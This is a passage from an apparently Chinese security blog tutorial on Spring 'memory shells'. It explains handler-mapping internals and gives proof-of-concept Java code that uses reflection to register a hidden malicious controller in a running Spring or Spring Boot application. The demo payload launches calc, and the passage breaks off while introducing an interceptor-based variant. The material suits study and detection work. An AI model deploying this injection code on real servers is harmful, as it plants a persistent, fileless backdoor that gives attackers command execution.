映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractHandlerMethodMapping<br>在其detectHandlerMethods() 方法中</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">detectHandlerMethods</span><span class="token punctuation">(</span><span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> handlerType <span class="token operator">=</span> handler <span class="token keyword">instanceof</span> <span class="token class-name">String</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>handler<span class="token punctuation">)</span> <span class="token operator">:</span> handler<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> userType <span class="token operator">=</span> <span class="token class-name">ClassUtils</span><span class="token punctuation">.</span><span class="token function">getUserClass</span><span class="token punctuation">(</span>handlerType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Method</span><span class="token punctuation">&gt;</span></span> methods <span class="token operator">=</span> <span class="token class-name">HandlerMethodSelector</span><span class="token punctuation">.</span><span class="token function">selectMethods</span><span class="token punctuation">(</span>userType<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">MethodFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">matches</span><span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token class-name">AbstractHandlerMethodMapping</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMappingForMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> userType<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Iterator</span> var6 <span class="token operator">=</span> methods<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span>var6<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">T</span> mapping <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMappingForMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> userType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">registerHandlerMethod</span><span class="token punctuation">(</span>handler<span class="token punctuation">,</span> method<span class="token punctuation">,</span> mapping<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean</p><pre class="language-java" data-language="java"><code class="language-java">context<span class="token punctuation">.</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token string">"dynamicController"</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"恶意Controller"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>RequestMappingHandlerMapping</span> requestMappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Method</span> m1 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMethodMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"detectHandlerMethods"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>requestMappingHandlerMapping<span class="token punctuation">,</span> <span class="token string">"dynamicController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="完整Poc"><a href="#完整Poc" class="headerlink" title="完整Poc"></a>完整Poc</h3><h4 id="spring-Tomcat环境"><a href="#spring-Tomcat环境" class="headerlink" title="spring+Tomcat环境"></a>spring+Tomcat环境</h4><p>恶意类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan<span class="token punctuation">.</span></span><span class="token class-name">Spring</span><span class="token punctuation">.</span>controller<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shell_Controller</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token class-name">Shell_Controller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shellMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan<span class="token punctuation">.</span></span><span class="token class-name">Spring</span><span class="token punctuation">.</span>controller<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ContextLoader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestAttributes</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContextUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">PatternsRequestCondition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">RequestMethodsRequestCondition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingInfo</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">RequestContextUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Objects</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/sh"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span> <span class="token punctuation">{</span><span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span><span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><span class="token class-name">RequestMappingHandlerMapping</span> r <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Shell_Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 3. 定义访问 controller 的 URL 地址</span><span class="token class-name">PatternsRequestCondition</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PatternsRequestCondition</span><span class="token punctuation">(</span><span class="token string">"/hahaha"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><span class="token class-name">RequestMethodsRequestCondition</span> ms <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMethodsRequestCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 5. 在内存中动态注册 controller</span><span class="token class-name">RequestMappingInfo</span> info <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> ms<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>r<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.yyjccc.memorytrojan.Spring.controller.Shell_Controller"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"shell2"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="Springboot环境"><a href="#Springboot环境" class="headerlink" title="Springboot环境"></a>Springboot环境</h4><blockquote><p>Spring 2.5 开始到 Spring 3.1 之前一般使用 org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping 映射器 ；<br>Spring 3.1 开始及以后一般开始使用新的 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping 映射器来支持@Contoller和@RequestMapping注解。</p></blockquote><p><strong>在使用 Springboot 2.6.0 版本测试时，发现注入上面内存马后无法执行。而用低于2.6.0 版本的 Springboot是可以的。</strong></p><p>而在 Springboot 2.6.0 环境下注入Controller内存马后会报500错误，错误提示 java.lang.IllegalArgumentException: Expected lookupPath in request attribute “org.springframework.web.util.UrlPathHelper.PATH”，如下图：<br><img src="/img/3-12/16.png"><br>原因在于从 Springboot 2.6.0 版本开始，官方修改了url路径的默认匹配策略，版本发布日志部分如下：</p><img src="/img/3-12/17.png"><p>如果在 Springboot 2.6.0 的环境下，通过 application.properties配置文件设置spring.mvc.pathmatch.matching-strategy的值为ant_path_matcher，即修改服务端的路径匹配策略为 AntPathMatcher，注入的Controller内存马后访问就没问题了(不过一般也不会怎么做吧（:</p><p><strong>看看Springboot在启动服务时是如何将代码中的Controller一一创建出来，并保存在什么地方，然后客户端访问指定url时，服务端便会去这个地方去取</strong>。其中相关源码如下：<br><img src="/img/3-12/18.png"></p><p>其中，methods是一个map对象，Method对象作为键，相应的包含访问路径等信息的RequestMappingInfo对象作为值。最后遍历methods这个map集合，对每一项进行注册，即把每一个method、访问路径及Controller保存到 AbstractHandlerMethodMapping.MappingRegistry对象中。</p><p>再看一下methods里的每一项，作为key的Method对象很好理解，那作为value的RequestMappingInfo对象时如何创建的呢？还是上面的代码，它是由RequestMappingHandlerMapping#getMappingForMethod()方法创建的，该方法又调用了 RequestMappingInfo#createRequestMappingInfo(RequestMapping, RequestCondition)方法，来看一下createRequestMappingInfo(RequestMapping, RequestCondition) 方法的实现：<br><img src="/img/3-12/19.png"><br>也就是说不能用原来new的方法创建RequestInfo（des），而是使用Builder创建</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>webshell<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">RequestMethodsRequestCondition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingInfo</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BootShellController</span> <span class="token punctuation">{</span><span class="token comment">/** * 适用于 SpringMVC+Tomcat的环境，以及Springboot 2.x 环境. */</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/boot"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SpringControllerMemShell2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span><span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration</span> config <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration</span><span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> method2 <span class="token operator">=</span> <span class="token class-name">Shell_Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"shellMethod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RequestMethodsRequestCondition</span> ms <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMethodsRequestCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RequestMappingInfo</span> info <span class="token operator">=</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/bash"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Shell_Controller</span> shellController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shell_Controller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span>shellController <span class="token punctuation">,</span> method2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"bash"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Interceptor型"><a href="#Interceptor型" class="headerlink" title="Interceptor型"></a>Interceptor型</h2><p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。<br>在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p><ul><li>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</li><li>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</li></ul><h3 id="Interceptor使用"><a href="#Interceptor使用" class="headerlink" title="Interceptor使用"></a>Interceptor使用</h3><p>这里我们选择继承HandlerInterceptor接口来实现一个Interceptor。HandlerInterceptor接口有三个方法，如下</p><ul><li>preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li><li>postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li><li>afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>shell<span class="token punctuation">.</span>interceptor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Spring_Interceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//如果请求路径为/login则放行</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"LoginIn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            writer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"LoginInFirst"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 